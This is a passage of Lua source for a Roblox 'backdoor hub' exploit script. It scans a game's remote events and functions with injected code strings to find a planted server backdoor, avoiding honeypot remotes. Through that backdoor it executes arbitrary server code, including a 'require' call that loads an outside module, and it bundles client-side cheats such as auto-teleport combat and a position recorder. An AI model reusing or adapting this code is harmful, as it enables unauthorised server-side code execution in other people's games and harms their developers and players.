			end

			if found == false then
				create("Error!", "Remote Event/Function is NOT found in this game. Backdoor will not work here. Sorry! D:")
				foundas = false
			end
			if found == true and obj:GetTags()[1] ~= "WAWACODE" then
				create("Error!", "Remote Event/Function is fake one by developers. Backdoor will not work here. Sorry! D:")
				foundas=false
			end
		end
		return foundas
	end
	local check2 = false
	local stopchecking = false
	task.wait(2)
	
	local callback_func = Instance.new("BindableFunction")
	callback_func.OnInvoke=function(option)
		if option=="Stop" then
			stopchecking = true
		end
	end
	if foundas==false then
		create_withoptions("Not found c00lspawnn's backdoor remote", "finding LALOL hub's backdoor remote. ".. os.clock()- timee.."s",5,"Continue", "Stop",callback_func)
		task.wait(3)
		if stopchecking==true then
			return false
		end
		if stopchecking==true then return end
		if stopchecking==true then return end		
		if stopchecking==true then return end
		if stopchecking==true then return end
		if stopchecking==true then return end
		if stopchecking==true then return end
		local remotes={}
		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
			while true do
				if stopchecking==true then return end
				task.wait()
				code=generateName(math.random(12,30))
				if not remotes[code] then break end
			end
			spawn(function() protected_backdoor:InvokeServer('idk,,,', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
			remotes[code]=protected_backdoor
		end
		for i,remote in game:GetDescendants() do
			if stopchecking==true then return end
			if not remote:IsA('RemoteEvent') then 
				if not remote:IsA('RemoteFunction') then continue end
			end
			if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
				continue
			end

			if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
				if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
					continue
				end

				if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
					continue
				end
				if remote.Parent.Name=='DefaultChatSystemChatEvents' then
					continue
				end
			end
			while true do
				if stopchecking==true then return end
				code=generateName(math.random(12,30))
				if not remotes[code] then break end
			end
			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
			remotes[code]=remote
		end
		for i=1,100 do
			if stopchecking==true then return end
			for i,remote in remotes do
				if stopchecking==true then return end
				local code=i
				if workspace:FindFirstChild(code) then
					r=remote
					create("Found!", "Found LALOL's hub backdoor remote in "..os.clock()-timee.."s")
					return true
				end
			end
			task.wait()
		end

		check2 = false
	end



	return check2
end

-- its obvious
function from_base64(data)
	local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if (x == '=') then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
		return r;
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if (#x ~= 8) then return '' end
		local c=0
		for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end

local function setclipboardfunc(str : string)
	setclipboard(str)
	create("Clipboard","Copy clipboard has been used")
end

function typewrite(TextLabel,text, waiter)
	for i = 1,#text do
		TextLabel.Text = string.sub(text,1,i)
		task.wait(waiter)
	end
end

local function get_gamename()
	return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
end

local current_bindednum = {}
local current_binded = {} 

local function search(name)
	for i,v in pairs(current_binded) do
		if v[1]==name then
			return v
		end
	end
end

local function unbind_(name)
	for i,v in pairs(current_binded) do
		if v[1]==name then
			table.remove(current_bindednum,i)
			table.remove(current_binded,i)
		end
	end
end

local function bind_(name,keybind,func)
	local value = true
	table.insert(current_binded, {name,value})
	table.insert(current_bindednum, name)
	print(current_binded)
	local c = nil
	c = game.UserInputService.InputBegan:Connect(function(k,g)
		local searchuh = search(name)
		if searchuh then
			if searchuh[2]==false then c:Disconnect() return end
			if g then return end
			if k.KeyCode==keybind then
				func()
			end
		end
	end)
end
local gameslist = nil
local functions = {
	["Goku"] = function()
		local range = 100
		local teleport_range = 120
		local stopped = false
		local disabled = false
		local con
		create("Info","Z to Stop, C to Disable")

		local Z_Bind = bind_("ZGoku",Enum.KeyCode.Z,function()
			stopped = not stopped
			if stopped==true then
				create("Info","Goku script is Disabled")
			else
				create("Info","Goku script is Enabled")
			end
		end) 

		local C_Bind = bind_("CGoku",Enum.KeyCode.C,function()
			disabled = true
			stopped = false
			con:Disconnect()
			unbind_("ZGoku")
			unbind_("CGoku")
			create("Info","Goku is Disabled")
		end) 
		
		task.spawn(function()
			while task.wait() do
				if disabled == true then break end
				local player = game.Players.LocalPlayer
				local chr = workspace.Live[player.Name] or game.Players.LocalPlayer.Character
				local hrp = chr:WaitForChild("Torso")
				if stopped == false then

					task.spawn(function()
						for i,v in pairs(game.Players:GetChildren()) do
							local other_chr = v.Character
							local other_hrp = other_chr.Torso
							if (hrp.Position - other_hrp.Position).Magnitude <= range then
								if v.Name == player.Name then return end
								chr:MoveTo(other_hrp.Position - other_hrp.CFrame.LookVector * teleport_range)
							end
						end

					end)
					for i,v in pairs(workspace.Live:GetChildren()) do
						local other_chr = v
						local other_hrp = other_chr.Torso
						if (hrp.Position - other_hrp.Position).Magnitude <= range then
							if v.Name == player.Name then return end
							chr:MoveTo(other_hrp.Position - other_hrp.CFrame.LookVector * teleport_range)
						end
					end
				else
					if chr.Humanoid.Health <= 35 then
						chr:MoveTo(hrp.Position - hrp.CFrame.LookVector * teleport_range)
					end
				end
			end
		end)
		
		con = game["Run Service"].RenderStepped:Connect(function()
			if disabled == true then con:Disconnect() return end
			local player = game.Players.LocalPlayer
			local chr = workspace.Live[player.Name] or game.Players.LocalPlayer.Character
			local hrp = chr:WaitForChild("Torso")
			if stopped == false then
				
				task.spawn(function()
					for i,v in pairs(game.Players:GetChildren()) do
						local other_chr = v.Character
						local other_hrp = other_chr.Torso
						if (hrp.Position - other_hrp.Position).Magnitude <= range then
							if v.Name == player.Name then return end
							chr:MoveTo(other_hrp.Position - other_hrp.CFrame.LookVector * teleport_range)
						end
					end

				end)
				for i,v in pairs(workspace.Live:GetChildren()) do
					local other_chr = v
					local other_hrp = other_chr.Torso
					if (hrp.Position - other_hrp.Position).Magnitude <= range then
						if v.Name == player.Name then return end
						chr:MoveTo(other_hrp.Position - other_hrp.CFrame.LookVector * teleport_range)
					end
				end
			else
				if chr.Humanoid.Health <= 35 then
					chr:MoveTo(hrp.Position - hrp.CFrame.LookVector * teleport_range)
				end
			end
		end)

	end,
}
gameslist = {
	["TSB"] = function()
			local f = create_template("TSB")
			local s = scroll_frame_template(f)
			local list = {
				"Goku",
			}
			local functions = {
				["Goku"] = function()
					functions.Goku()
				end,
			}
			local buttons = creator_buttons(s,list,functions,true)
		end,

}


-- GAMBLING!
local function gambler()
	local create_guigamble = Instance.new("ScreenGui",interface)
	create_guigamble.ResetOnSpawn = false
	create_guigamble.IgnoreGuiInset = true

	local frame = frame_template(create_guigamble)
	frame.ClipsDescendants = false

	local value1, value2, value3
	local activatorbool = Instance.new("BoolValue")
	value1 = Instance.new("StringValue")
	value2 = Instance.new("StringValue")
	value3 = Instance.new("StringValue")

	local connectors = {}

	local function createslot(pos,activator:BoolValue,value,long)
		task.spawn(function()
			local gambleframe = Instance.new("Frame",frame)
			gambleframe.Size = UDim2.new(0.3,0,0.35,0)
			gambleframe.ClipsDescendants = true
			gambleframe.AnchorPoint = Vector2.new(0.5,0.5)
			gambleframe.Position = UDim2.new(pos,0,0.5,0)	

			local test = Instance.new("TextLabel",gambleframe)
			test.BackgroundTransparency = .35
			test.Size = UDim2.new(.5,0,.5,0)
			test.Position = UDim2.new(0.5,0,0,0)
			test.Text = "1"
			test.AnchorPoint = Vector2.new(0.5,0.5)	
			test.TextScaled = true
			local middleline = Instance.new("Frame",gambleframe)
			middleline.Size = UDim2.new(1,0,0.35,0)
			middleline.AnchorPoint = Vector2.new(0.5,0.5)
			middleline.Position = UDim2.new(0.5,0,0.5,0)
			middleline.BackgroundColor3 = Color3.new(0, 0, 0)
			middleline.BackgroundTransparency = 0.85
			middleline.BorderSizePixel = 0
			middleline.ZIndex = 1



			local nums = {
				2,3,4,5,6,7,1
			}

			local num2down = {
				1,7,6,5,4,3,2
			}

			local cur = test
			for i,v in pairs(nums) do
				local test2 = cur:Clone()
				test2.Parent = cur
				test2.Text = v
				test2.Size = UDim2.new(1,0,1,0)
				test2.Position = UDim2.new(0.5,0,-0.5,0)
				test2:ClearAllChildren()
				cur = test2
			end

			local cur2 = test

			local e = 1.5
			local elist = {}
			local stufflist = {}
			for i,v in pairs(nums) do
				local test2 = cur2:Clone()
				test2.Parent = cur2
				test2.Text = v
				test2.Size = UDim2.new(1,0,1,0)
				test2.Position = UDim2.new(0.5,0,1.5,0)
				e += 1.5
				test2:ClearAllChildren()
				cur2 = test2

				table.insert(stufflist,test2)
			end

			local getrandom_1 = math.random(1,7)
			local a = "0."..getrandom_1


			local auh = {
				[1] = -0.5,
				[2] = 0,
				[3] = 0.5,
				[4] = 1,
				[5] = 1.5,
				[6] = 2,
				[7] = 2.5,
			}

			local current = 2
			if getrandom_1==current then
				repeat
					getrandom_1 = math.random(1,7)
				until getrandom_1~=current
			end
			current = getrandom_1

			--game.TweenService:Create(test,TweenInfo.new(3),{Position = UDim2.new(0.5,0,-auh[getrandom_1],0)}):Play()

			if value then
				value.Value = current
				print(current)
			end

			task.wait(1)

			activator.Changed:Connect(function()
				if getrandom_1==current then
					repeat
						getrandom_1 = math.random(1,7)
					until getrandom_1~=current
				end
				current = getrandom_1
				if value then
					value.Value = current
					print(current)
				end
				--	print(current)
				--	print(auh[current])
				game.TweenService:Create(test,TweenInfo.new(long),{Position = UDim2.new(0.5,0,-auh[current],0)}):Play()
			end)

		end)
	end
	closebutton(frame,create_guigamble,function()
		create("oh", "no more gambling???????????????? sadness")
	end)
	createslot(0.2,activatorbool,value1,1)
	createslot(0.5,activatorbool,value2,2)
	createslot(0.8,activatorbool,value3,3)

	local button = Instance.new("TextButton",frame)
	button.Size = UDim2.new(0.5,0,0.15,0)
	button.BackgroundColor3 = Color3.new(0.729412, 0.729412, 0.729412)
	button.BackgroundTransparency = 0.25
	button.Text = "Spin"
	button.TextScaled = true
	button.AnchorPoint = Vector2.new(0.5,0.5)
	button.Position = UDim2.new(0.5,0,0.85,0)

	local title = Instance.new("TextLabel",frame)
	title.Size = UDim2.new(1,0,0.1,0)
	title.Position = UDim2.new(0.5,0,0.1,0)
	title.TextScaled = true
	title.TextColor3 = Color3.fromRGB(39, 244, 255)
	title.BackgroundTransparency = 1
	title.Text = "CLIENT SIDE"
	title.AnchorPoint = Vector2.new(0.5,0.5)
	local con 
	con = game["Run Service"].RenderStepped:Connect(function()
		local evil = false
		if r then
			title.TextColor3 = Color3.fromRGB(75, 255, 62)
			evil = true
			title.Text = "SERVER SIDE"
			con:Disconnect()
		end
	end)

	local b = Instance.new("TextLabel",frame)
	b.Size = UDim2.new(1,0,0.1,0)
	b.Position = UDim2.new(0.5,0,0.25,0)
	b.TextScaled = true
	b.TextColor3 = Color3.fromRGB(255, 255, 255)
	b.BackgroundTransparency = 1
	b.Text = "3   3   3"
	b.AnchorPoint = Vector2.new(0.5,0.5)
	b.TextTransparency = 1
	b.RichText = true
	local delayer = false

	local bindable = Instance.new("BindableFunction")

	bindable.OnInvoke = function()
		if r then
			create("Hakari reference", "for the next eternity of this planet, "..game.Players.LocalPlayer.DisplayName.." is now immortal")
			button:Destroy()
			local title = Instance.new("TextLabel",frame)
			title.Size = UDim2.new(1,0,0.1,0)
			title.Position = UDim2.new(0.5,0,0.85,0)
			title.TextScaled = true
			title.TextColor3 = Color3.fromRGB(255, 255, 255)
			title.BackgroundTransparency = 0
			title.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
			title.Text = ""
			title.RichText = true
			title.TextScaled = true
			title.AnchorPoint = Vector2.new(0.5,0.5)
			local h = Instance.new("TextLabel",title)
			h.Size = UDim2.new(1,0,1,0)
			h.BackgroundTransparency = 1
			h.TextColor3 = Color3.fromRGB(255,255,255)
			h.RichText = true
			h.TextScaled = true
			title.Changed:Connect(function()
				h.Text = run(title.Text)
			end)

			typewrite(title, "require(96835698003070)",0.01)
			task.wait(0.05)
			create("funny", "running ...")
			task.wait(1)

			if r then
				if r:IsA("RemoteEvent") then
					r:FireServer("require(96835698003070)")
				elseif r:IsA("RemoteFunction") then
					r:InvokeServer("require(96835698003070)")
				end
			end
		else
			create("Hakari reference", "for the next eternity of this planet, "..game.Players.LocalPlayer.DisplayName.." is now immortal")
		end
	end

	button.MouseButton1Click:Connect(function()
		if delayer==true then return end
		activatorbool.Value = not activatorbool.Value
		delayer = true
		task.delay(3,function()
			delayer = false
			TweenService:Create(b,TweenInfo.new(1),{TextTransparency = 0}):Play()
			b.Text = tostring(value1.Value).. "   ".. tostring(value2.Value).. "   ".. tostring(value3.Value)

			b.Text=b.Text:gsub("7",'<font color="#3CAE63">7</font>')

			task.delay(0.5,function()
				TweenService:Create(b,TweenInfo.new(1),{TextTransparency = 1}):Play()
			end)

			if value1.Value=="7" and value2.Value=="7" and value3.Value=="7" then
				bindable:Invoke()
			end
		end)
	end)
end
local record_table = {}

local function gui(plr,reset_by_spawn,ignoreguinset)
	local parent = game.CoreGui
	if game["Run Service"]:IsStudio()==true then
		parent = game.Players.LocalPlayer.PlayerGui
	end
	local create = Instance.new("ScreenGui",parent)
	create.ResetOnSpawn = reset_by_spawn or false
	create.IgnoreGuiInset = ignoreguinset or true

	return create
end

local nodes_part = Instance.new("Folder",workspace)
nodes_part.Name = "Chiikawa's Nodes"
local function create_node(pos,name)
	local part = Instance.new("Part")
	part.Anchored = true
	part.CanCollide = false
	part.Position = pos
	part.Transparency = 0.6
	part.Name = name
	part.Color = Color3.fromRGB(255, 255, 255)
	part.Material = Enum.Material.Neon
	part.Parent = nodes_part
	part.Size = Vector3.new(1,1,1)

	local mini_hitbox = Instance.new("Part")
	mini_hitbox.Size = Vector3.new(0.5,0.5,0.5)
	mini_hitbox.Position = part.Position
	mini_hitbox.Anchored = true
	mini_hitbox.Material = "Neon"
	mini_hitbox.Color = Color3.fromRGB(255, 0, 4)
	mini_hitbox.CanCollide = false
	mini_hitbox.Parent = part

	task.delay(0.5,function()
		mini_hitbox:Destroy()
	end)
end

function player_recorder()
	local record = false
	game["Run Service"].RenderStepped:Connect(function()
		if record==false then return end
		create_node(chr.HumanoidRootPart.CFrame.p,#record_table+1)
		table.insert(record_table,chr.HumanoidRootPart.CFrame)
	end)

	local g = gui(plr,false)
	local frame = frame_template(g,UDim2.new(0.25,0,0.155,0),nil,UDim2.new(0.5,0,0.85,0),nil,nil,nil,nil)
	closebutton(frame,g,function()
		nodes_part:Destroy()
	end)

	hidebutton(frame,function()
		openbutton("Player Recorder",frame)
	end)
	local bar1 = Instance.new("Frame",frame)
	bar1.Size = UDim2.new(1,0,0.1,0)
	bar1.Position = UDim2.new(0,0,1,0)

	local textlabela = Instance.new("TextLabel",bar1)
	textlabela.Size = UDim2.new(1,0,1,0)
	textlabela.Text = "0% / 100%"
	textlabela.ZIndex = 5
	textlabela.BackgroundTransparency = 1

	local bar = Instance.new("Frame",bar1)
	bar.Size = UDim2.new(.5,0,1,0)
	bar.BackgroundColor3 = Color3.fromRGB(160, 255, 220)


	local textbutton = Instance.new("TextButton",frame)
	textbutton.Position = UDim2.new(0.15,0,0.5,0)
	textbutton.AnchorPoint = Vector2.new(0.5,0.5)
	textbutton.Text = "Record"
	textbutton.Size = UDim2.new(0.3,0,0.5,0)

	local looped = false
	local Loop = Instance.new("TextButton",frame)
	Loop.Position = UDim2.new(0.5,0,0.86,0)
	Loop.AnchorPoint = Vector2.new(0.5,0.5)
	Loop.Text = "Loop: X"
	Loop.Size = UDim2.new(0.5,0,0.2,0)

	local Play = Instance.new("TextButton",frame)
	Play.Position = UDim2.new(0.5,0,0.5,0)
	Play.AnchorPoint = Vector2.new(0.5,0.5)
	Play.Text = "Play"
	Play.Size = UDim2.new(0.35,0,0.5,0)

	local c = Instance.new("TextButton",frame)
	c.Position = UDim2.new(0.85,0,0.5,0)
	c.AnchorPoint = Vector2.new(0.5,0.5)
	c.Text = "Clear"
	c.Size = UDim2.new(0.3,0,0.5,0)
	local playing = false

	local function move()
		for i,v in pairs(record_table) do
			if playing == false then break end
			task.wait()
			chr:WaitForChild("HumanoidRootPart").Anchored = true
			chr:PivotTo(v)
			nodes_part:GetChildren()[i].Color = Color3.fromRGB(114, 255, 137)
			bar.Size = UDim2.new(i/#record_table,0,1,0)
			textlabela.Text = tostring(math.floor(i*100/#record_table)).."% / 100%"
		end
	end
	Loop.BackgroundColor3 = Color3.fromRGB(255, 140, 140)

	Loop.MouseButton1Click:Connect(function()
		looped = not looped
		if Loop.Text == "Loop: X" then
			Loop.Text = "Loop: O"
			Loop.BackgroundColor3 = Color3.fromRGB(160, 255, 220)
		else
			Loop.Text = "Loop: X"
			Loop.BackgroundColor3 = Color3.fromRGB(255, 140, 140)
		end
	end)
	Play.MouseButton1Click:Connect(function()
		if playing==true then
			playing = false
			return
		end
		Play.Text = "Stop"
		playing = true
		task.spawn(function()
			for i,v in pairs(nodes_part:GetChildren()) do
				task.wait()
				v.Color = Color3.fromRGB(255,255,255)
				game.TweenService:Create(v,TweenInfo.new(1),{Transparency = 0.85}):Play()
			end
		end)

		if looped == false then
			move()
		else
			repeat
				move()
			until playing == false or looped == false
		end
		Play.Text = "Play"
		playing = false
		chr:WaitForChild("HumanoidRootPart").Anchored = false
		task.spawn(function()
			for i,v in pairs(nodes_part:GetChildren()) do
				task.wait()
				v.Color = Color3.fromRGB(255,255,255)
				game.TweenService:Create(v,TweenInfo.new(1),{Transparency = 0.6}):Play()
			end
		end)
	end)

	chr:WaitForChild("Humanoid").Died:Connect(function()
		nodes_part:ClearAllChildren()
		table.clear(record_table)
		playing = false
		Play.Text = "Play"
		g:Destroy()
	end)

	c.MouseButton1Click:Connect(function()
		playing = false
		Play.Text = "Play"
		table.clear(record_table)
		nodes_part:ClearAllChildren()
	end)

	textbutton.MouseButton1Click:Connect(function()
		record = not record
		if textbutton.Text == "Record" then
			textbutton.Text = "Recording"
		else
			textbutton.Text = "Record"
		end
	end)
end


local function games()
	local f = create_template("Games Hub")
	local s = scroll_frame_template(f)
	local list = {
		"TSB",
		"Forsaken",
		"Template"
	}
	local function teto(button)
		gameslist[button]()
	end
	local buttons = creator_buttons(s,list,nil,true,teto)
end

local function auto_function(func)
	return function()
		func()
	end
end

local function haxxs()

	local f = create_template("Haxxs")
	local s = scroll_frame_template(f)

	local buttons = {"Player Recorder"}
	local funcs = {
		["Player Recorder"]=function ()
			player_recorder()
		end
	}
	buttons = creator_buttons(s,buttons,funcs,true)

end

-- yeah bro
local function createclientsidehub()
	-- FARTS VERY LOUDLY SO I DONT KNOW

	local f = create_template("Hub")
	local s = scroll_frame_template(f)

	local imagelabel = Instance.new("ImageLabel",f)
	imagelabel.Size = UDim2.new(1,0,1,0)
	imagelabel.BackgroundTransparency = 1
	imagelabel.Image = "rbxassetid://74595603256262"
	imagelabel.ImageColor3 = Color3.fromRGB(255,255,255)
	imagelabel.AnchorPoint = Vector2.new(0.5,0.5)
	imagelabel.Position = UDim2.new(0.5,0,0.5,0)
	imagelabel.ScaleType = Enum.ScaleType.Fit
	imagelabel.ImageTransparency = 0.75

	game["Run Service"].RenderStepped:Connect(function(d)
		imagelabel.Rotation += 0.15
	end)

	local buttons = {"Music player", "Slots", "Haxxs", "Games"}
	local funcs = {
		["Music player"] = function()
			music_creator()
		end,
		["Slots"] = function()
			gambler()
		end,
		["Haxxs"] = function()
			haxxs()
		end,
		["Games"] = function()
			games()
		end
	}
	buttons = creator_buttons(s,buttons,funcs,true)
end

local bindable = Instance.new("BindableFunction")
bindable.OnInvoke = function(option)
	if option == "Ok!yes" then
		createclientsidehub()
	end
end

-- create hub
local function createHandler()
	create("Made by c00lspawnn team!", "wawa backdoor hub loadin' :3")
	task.wait(2)

	create("Finding backdoor", "yeah wait a bit")

	task.wait(0.05)
	local breakwait = false
	local is_found = find()
	print(r)
	if is_found==false then
		if r then
			return
		end
		task.wait(1)		
		breakwait = true
		create_withoptions("No Found", "Sorry! This place is not have backdoor. Sorry! \n (CLIENT SIDE) \n wanna open hub?",5,"Ok!yes","No!!!1",bindable)
		return
	end


	repeat
		task.wait()
		if breakwait==true then
			is_found=true
		end
	until is_found==true
	if breakwait==true then return end
	create("Found it!", "Thanks for waiting! Backdoor name in case: '".. r.Name.."'")

	local verified = false

	local plrGui_ = Instance.new("ScreenGui",interface)
	plrGui_.ResetOnSpawn = false
	plrGui_.IgnoreGuiInset = true
	plrGui_.Name = "SSBHLLOADER"
	local find = game.Players.LocalPlayer:FindFirstChild("SBHVerified")
	if not find then
		task.wait(2)
		create("Wait!", "key verification! :P")
		local loading_frae = Instance.new("Frame",plrGui_)
		loading_frae.Size = UDim2.new(.2,0,.2,0)
		loading_frae.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
		loading_frae.BackgroundTransparency = 0.1
		loading_frae.Visible = true
		loading_frae.Position = UDim2.new(0.5,0,0.5,0)
		loading_frae.AnchorPoint = Vector2.new(0.5,0.5)
		loading_frae.Active = true
		loading_frae.Draggable = true
		closebutton(loading_frae,plrGui_,function()
			create("Closin", "bay bay!")
		end)

		local key_redeemer = Instance.new("TextBox",loading_frae)

		key_redeemer.BackgroundColor3 = Color3.fromRGB(10,10,10)
		key_redeemer.BorderColor3 = Color3.fromRGB(255,255,255)
		key_redeemer.TextColor3 = Color3.fromRGB(255, 255, 255)
		key_redeemer.TextScaled = true
		key_redeemer.PlaceholderText = "Enter Key"
		key_redeemer.Text = ""
		key_redeemer.BackgroundTransparency = 0.85
		key_redeemer.Size = UDim2.new(0.3,0,0.3,0)
		key_redeemer.Position = UDim2.new(0.2,0,.5,0)
		key_redeemer.AnchorPoint = Vector2.new(0.5,0.5)

		local imagelabel = Instance.new("ImageLabel",loading_frae)
		imagelabel.Size = UDim2.new(1,0,1,0)
		imagelabel.BackgroundTransparency = 1
		imagelabel.Image = "rbxassetid://74595603256262"
		imagelabel.ImageColor3 = Color3.fromRGB(255,255,255)
		imagelabel.AnchorPoint = Vector2.new(0.5,0.5)
		imagelabel.Position = UDim2.new(0.5,0,0.5,0)
		imagelabel.ScaleType = Enum.ScaleType.Fit
		imagelabel.ImageTransparency = 0.75

		game["Run Service"].RenderStepped:Connect(function()
			imagelabel.Rotation += 0.1
		end)	

		local link = Instance.new("TextButton",loading_frae)
		link.BackgroundTransparency = 0.85
		link.Text = "Link: 'https://discord.gg/C8shJzycQd' for key!"
		link.BackgroundColor3 = Color3.fromRGB(10,10,10)
		link.Size = UDim2.new(0.65,0,1,0)
		link.TextScaled = true
		--	link.TextEditable = false
		--	link.ClearTextOnFocus = false
		link.TextColor3 = Color3.fromRGB(255,255,255)
		link.Position = UDim2.new(0.7,0,.5,0)
		link.AnchorPoint = Vector2.new(0.5,0.5)

		link.MouseButton1Click:Connect(function()
			create("Link has been copied","ctrl+v to paste for bun ppl")
			setclipboard("https://discord.gg/C8shJzycQd")
		end)	

		key_redeemer.FocusLost:Connect(function(enterPressed)
			if enterPressed then
				local key = key_redeemer.Text
				if key == from_base64("c3Bhd24=") then
					verified = true
					create("Key Verified!", "^_^")

					local injected = Instance.new("BoolValue",game.Players.LocalPlayer)
					injected.Name="SBHVerified"

					loading_frae:Destroy()
				else
					create("Key Invalid!", "X_X")
				end
			end
		end)
	else
		create("Verified", "You're already verified!")
		verified = true
	end

	repeat
		task.wait()
	until verified == true
	create("Loadin!", "hold on!11")
	--	r:InvokeServer("Instance.new('BoolValue',game.Players.".. game.Players.LocalPlayer.Name ..").Name = 'SS_BHInjected'")
	task.wait(2.5)
	local frame = create_template("Backdoor Hub")

	frame.ClipsDescendants=false

	local imagelabel = Instance.new("ImageLabel",frame)
	imagelabel.Size = UDim2.new(1,0,1,0)
	imagelabel.BackgroundTransparency = 1
	imagelabel.Image = "rbxassetid://74595603256262"
	imagelabel.ImageColor3 = Color3.fromRGB(255,255,255)
	imagelabel.AnchorPoint = Vector2.new(0.5,0.5)
	imagelabel.Position = UDim2.new(0.5,0,0.5,0)
	imagelabel.ScaleType = Enum.ScaleType.Fit
	imagelabel.ImageTransparency = 0.75

	game["Run Service"].RenderStepped:Connect(function(d)
		imagelabel.Rotation += 0.15
	end)


	local scrollingframe = scroll_frame_template(frame)
	local buttons = {"Inject","Reset","Music player", "Slots", "Haxxs", "Games"}
	
	local funcs = {
		["Reset"]=function()
			remove()
			runRemote(r,"game.Players."..game.Players.LocalPlayer.Name..":LoadCharacter()")	
		end,
		["Inject"]=function()
			gui_create()
		end,
		["Music player"]=function()
			music_creator()
		end,
		["Slots"]=function()
			gambler()
		end,
		["Haxxs"]=function()
			haxxs()
		end,
		["Games"]=function()
			games()
		end,
		
	}
	
	creator_buttons(scrollingframe,buttons,funcs,true)
end

createHandler()


function remove()
	create("Sorry!", "Im have to delete everything due 'some bug' D:")
	for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
		if v.Name == "SSBHLLOADER" or v.Name == "SBPlayer" or v.Name == "HidedHub" then
			v:Destroy()
		end
	end

	music_alpha:Destroy()
end

local skibbity = false
game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Died:Connect(function()
	skibbity = true
end)

game.Players.LocalPlayer.CharacterAdded:Connect(function()
	if skibbity==true then
		remove()
		if script:IsA("LocalScript") then
			script:Clone().Parent = game.Players.LocalPlayer.PlayerGui
		end

		skibbity = false
	end
end)
